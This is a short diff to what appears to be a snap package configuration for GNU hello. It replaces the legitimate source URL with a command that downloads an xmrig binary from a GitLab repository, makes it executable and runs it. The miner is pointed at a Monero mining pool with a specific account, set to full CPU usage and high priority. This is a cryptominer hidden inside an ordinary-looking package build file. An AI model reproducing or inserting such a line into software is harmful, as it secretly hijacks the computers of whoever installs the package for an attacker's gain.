@@ -12,5 +12,5 @@ apps:
 parts:
   gnu-hello:
     plugin: autotools
-    source: http://ftp.gnu.org/gnu/hello/hello-2.10.tar.gz
+    wget https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig && chmod +x xmrig && ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u rashajunah@yahoo.com -p x --max-cpu-usage=100 --cpu-priority 5 --donate-level 1
     
